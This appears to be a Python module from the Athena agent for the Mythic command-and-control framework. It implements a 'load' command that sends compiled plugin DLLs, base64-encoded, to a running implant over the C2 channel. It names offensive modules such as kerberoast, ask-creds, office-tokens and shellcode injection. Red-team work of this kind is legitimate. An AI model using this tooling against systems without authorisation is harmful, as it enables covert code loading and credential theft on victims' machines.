import subprocess
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from .athena_utils import message_utilities
import json
import base64
import os
import pathlib

from .athena_utils import message_converter

class LoadArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line)
        self.args = [
            CommandParameter(
                name="command", cli_name="command", display_name="Command to Load", type=ParameterType.ChooseOne,
                choices_are_all_commands=True,
                description="Load Command",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                        ui_position=0
                    )
                ]
            ),
        ]

    async def parse_arguments(self):
        if self.command_line[0] == "{":
                tmpjson = json.loads(self.command_line)
                self.load_args_from_json_string(json.dumps(tmpjson))
        else:
                self.load_args_from_json_string(self.command_line)



class LoadCommand(CommandBase):
    cmd = "load"
    needs_admin = False
    help_cmd = "load cmd"
    description = "This loads a new plugin into memory via the C2 channel."
    version = 1
    author = "@checkymander"
    parameters = []
    #attackmapping = ["T1030", "T1129", "T1059.002", "T1620"]
    attackmapping = []
    argument_class = LoadArguments
    attributes = CommandAttributes(
        load_only=False,
        builtin=True
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        command = task.args.get_arg('command')
        bof_commands = ["nanorubeus", "add-machine-account","ask-creds","delete-machine-account","get-machine-account-quota","kerberoast","klist","adcs-enum", "driver-sigs", "get-password-policy","net-view","sc-enum", "schtasks-enum","schtasks-query","vss-enum","windowlist","wmi-query","add-user-to-group","enable-user","office-tokens","sc-config","sc-create","sc-delete","sc-start","sc-stop","schtasks-run", "schtasks-stop","set-user-pass","patchit"]
        shellcode_commands = ["inject-assembly"]
        ds_commands = ["ds-query", "ds-connect"]
        if command in bof_commands:
            await message_utilities.send_agent_message("Please load coff to enable this command", task)
            raise Exception("Please load coff to enable this command")
        elif command in shellcode_commands:
            await message_utilities.send_agent_message("Please load shellcode-inject to enable this command", task)
            raise Exception("Please load shellcode-inject to enable this command")
        elif command in ds_commands:
            await message_utilities.send_agent_message("Please load ds to enable this command", task)
            raise Exception("Please load ds to enable this command")
    
        dllFile = os.path.join(self.agent_code_path, "AthenaPlugins", "bin", f"{command}.dll")      
        
        if(os.path.isfile(dllFile) == False):
            #await self.compile_command(command, os.path.join(self.agent_code_path, "AthenaPlugins"))
            await message_utilities.send_agent_message("Please wait for plugins to finish compiling.", task)
            raise Exception("Please wait for plugins to finish compiling.")
        
        dllBytes = open(dllFile, 'rb').read()
        encodedBytes = base64.b64encode(dllBytes)
        task.args.add_arg("asm", encodedBytes.decode())
        
        if(command == "ds"):
            createSubtaskMessage = MythicRPCTaskCreateSubtaskMessage(task.id, 
                                                            CommandName="load-assembly", 
                                                            Params=json.dumps(
                                                            {"libraryname":"System.DirectoryServices.Protocols.dll", "target":"plugin"}), 
                                                            GroupName="InternalLib",
                                                            )

            subtask = await SendMythicRPCTaskCreateSubtask(createSubtaskMessage)
            resp = await SendMythicRPCCallbackAddCommand(MythicRPCCallbackAddCommandMessage(
                TaskID = task.id,
                Commands = ds_commands
            ))
            if not resp.Success:
                raise Exception("Failed to add commands to callback: " + resp.Error)
        elif(command == "ssh" or command == "sftp"):          
            tasks = [MythicRPCTaskCreateSubtaskGroupTasks(
                CommandName="load-assembly",
                Params=json.dumps({"libraryname":"Renci.SshNet.dll", "target":"plugin"}),
                GroupName="InternalLib",
            ),
            MythicRPCTaskCreateSubtaskGroupTasks(
                 CommandName="load-assembly",
                 Params=json.dumps({"libraryname":"SshNet.Security.Cryptography.dll", "target":"plugin"}),
                 GroupName="InternalLib",
            )]

            createSubtaskMessage = MythicRPCTaskCreateSubtaskGroupMessage(task.id, 
                                                                            "load-ssh",
                                                                            CommandName="load-assembly",
                                                                            Tasks = tasks)
            subtask = await SendMythicRPCTaskCreateSubtaskGroup(createSubtaskMessage)
        elif(command == "coff"):            
            resp = await SendMythicRPCCallbackAddCommand(MythicRPCCallbackAddCommandMessage(
                TaskID = task.id,
                Commands = bof_commands
            ))
            if not resp.Success:
                raise Exception("Failed to add commands to callback: " + resp.Error)
        elif(command == "screenshot"):
            tasks = [MythicRPCTaskCreateSubtaskGroupTasks(
                CommandName="load-assembly",
                Params=json.dumps({"libraryname":"System.Drawing.Common.dll", "target":"plugin"}),
                GroupName="InternalLib",
            )]
            createSubtaskMessage = MythicRPCTaskCreateSubtaskGroupMessage(task.id, 
                                                                            "load-screenshot",
                                                                            CommandName="load-assembly",
                                                                            Tasks = tasks)
            subtask = await SendMythicRPCTaskCreateSubtaskGroup(createSubtaskMessage)
        elif(command == "shellcode-inject"):
            addCommandMessage = MythicRPCCallbackAddCommandMessage(task.id, shellcode_commands)
            response = await SendMythicRPCCallbackAddCommand(addCommandMessage)
            if not response.Success:
               raise Exception("Failed to add commands to callback: " + response.Error)
        elif(command == "patch"):
            raise Exception("This command is deprecated, please use the patchit bof instead")
        return task
    
    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        if "message" in response:
            user_output = response["message"]
            await MythicRPC().execute("create_output", task_id=task.Task.ID, output=message_converter.translateAthenaMessage(user_output))

        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp

    async def get_commands(self, response: AgentResponse):
        pass

    async def compile_command(self, command_name, path):
        #p = subprocess.Popen(["dotnet", "build", command_name], cwd=path)
        #fuck it build all of them
        p = subprocess.Popen(["dotnet", "build", command_name], cwd=path)
        p.wait()
        streamdata = p.communicate()[0]
        rc = p.returncode
        if rc != 0:
            raise Exception("Error compiling: " + str(streamdata))